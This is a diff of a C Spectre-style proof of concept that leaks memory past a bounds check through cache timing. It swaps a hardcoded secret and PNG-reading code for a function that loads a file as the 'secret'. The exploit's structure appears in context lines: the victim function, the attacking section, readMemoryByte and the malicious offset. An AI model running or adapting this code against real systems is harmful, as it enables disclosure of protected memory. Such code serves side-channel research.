@@ -27,8 +27,34 @@ uint8_t arr1[160] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
 
 uint8_t arr2[256 * 512];
 
-char *secret = "12345678911";
+const char *readimage()
 
+{
+    FILE *fp;
+    long lSize;
+    char *buffer;
+
+    fp = fopen("small.txt", "rb");
+    if (!fp)
+        perror("small.txt"), exit(1);
+
+    fseek(fp, 0L, SEEK_END);
+    lSize = ftell(fp);
+    rewind(fp);
+
+    /* allocate memory for entire content */
+    buffer = calloc(1, lSize + 1);
+    if (!buffer)
+        fclose(fp), fputs("memory alloc fails", stderr), exit(1);
+
+    /* copy the file into the buffer */
+    if (1 != fread(buffer, lSize, 1, fp))
+        fclose(fp), free(buffer), fputs("entire read fails", stderr), exit(1);
+
+    /* do your work here, buffer is a string contains the whole text */
+    fclose(fp);
+    return (buffer);
+}
 int fetch_victim(size_t index)
 {
     if (index < arr1_size)
@@ -44,14 +70,6 @@ int fetch_victim(size_t index)
 /*
 ATTACKING CODE
 */
-static void fatal_error(const char *message, ...)
-{
-    va_list args;
-    va_start(args, message);
-    vfprintf(stderr, message, args);
-    va_end(args);
-    exit(EXIT_FAILURE);
-}
 
 // GLOBAL PARAMETERS
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
@@ -152,73 +170,9 @@ void readMemoryByte(size_t target_idx, uint8_t value[2], int score[2])
 
 int main()
 {
-    const char *png_file = "test.png";
-    png_structp png_ptr;
-    png_infop info_ptr;
-    FILE *fp;
-    png_uint_32 width;
-    png_uint_32 height;
-    int bit_depth;
-    int color_type;
-    int interlace_method;
-    int compression_method;
-    int filter_method;
-    int j;
-    png_bytepp rows;
-    fp = fopen(png_file, "rb");
-    if (!fp)
-    {
-        fatal_error("Cannot open '%s': %s\n", png_file, strerror(errno));
-    }
-    png_ptr = png_create_read_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
-    if (!png_ptr)
-    {
-        fatal_error("Cannot create PNG read structure");
-    }
-    info_ptr = png_create_info_struct(png_ptr);
-    if (!png_ptr)
-    {
-        fatal_error("Cannot create PNG info structure");
-    }
-    png_init_io(png_ptr, fp);
-    png_read_png(png_ptr, info_ptr, 0, 0);
-    png_get_IHDR(png_ptr, info_ptr, &width, &height, &bit_depth,
-                 &color_type, &interlace_method, &compression_method,
-                 &filter_method);
-    rows = png_get_rows(png_ptr, info_ptr);
-    printf("Width is %d, height is %d\n", width, height);
-    int rowbytes;
-    rowbytes = png_get_rowbytes(png_ptr, info_ptr);
-    printf("Row bytes = %d\n", rowbytes);
-    for (j = 0; j < height; j++)
-    {
-        int i;
-        png_bytep row;
-        row = rows[j];
-        for (i = 0; i < rowbytes; i++)
-        {
-            png_byte pixel;
-            pixel = row[i];
-            if (pixel < 64)
-            {
-                printf("##");
-            }
-            else if (pixel < 128)
-            {
-                printf("**");
-            }
-            else if (pixel < 196)
-            {
-                printf("..");
-            }
-            else
-            {
-                printf("  ");
-            }
-        }
-        printf("\n");
-    }
-    return 0;
+
+    const char *secret = readimage();
+    printf("buffer %s", secret);
 
     size_t malicious_x = (size_t)(secret - (char *)arr1);
     int i, score[2], len = strlen(secret);
@@ -249,6 +203,7 @@ int main()
         printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
         printf("0x%02X=’%c’ score=%d ", value[0],
                (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+
         if (score[1] > 0)
         {
             printf("(second best: 0x%02X score=%d)", value[1], score[1]);
